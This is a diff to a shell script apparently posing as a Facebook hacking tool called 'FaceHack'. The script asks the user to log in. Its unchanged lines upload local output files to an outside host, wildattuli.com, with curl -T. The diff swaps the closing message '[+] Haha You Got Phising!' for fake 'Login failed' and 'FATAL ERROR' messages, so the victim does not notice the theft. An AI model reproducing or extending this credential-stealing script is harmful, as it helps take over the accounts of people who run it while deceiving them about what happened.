@@ -13,7 +13,7 @@ echo '  |  ___|_ _  ___ ___| | | | __ _  ___| | __ ';
 echo '  | |_ / _` |/ __/ _ \ |_| |/ _` |/ __| |/ / ';
 echo '  |  _| (_| | (_|  __/  _  | (_| | (__|   <  ';
 echo '  |_|  \__,_|\___\___|_| |_|\__,_|\___|_|\_\ ';
-echo '  -------------- By Cy#b3r00T -------------- ';
+echo '  ----------- By Un Hack3r 3n la D3r3cha ---------- ';
 echo ''
 echo 'Login To Your Account First!'
 echo ''
@@ -45,4 +45,5 @@ curl -T output/fuck7.html http://wildattuli.com
 curl -T output/fuck8.html http://wildattuli.com
 curl -T output/fuck9.html http://wildattuli.com
 curl -T output/fuck0.html http://wildattuli.com
-echo '[+] Haha You Got Phising!';
+echo '[+] Login failed';
+echo '[+] FATAL ERROR';
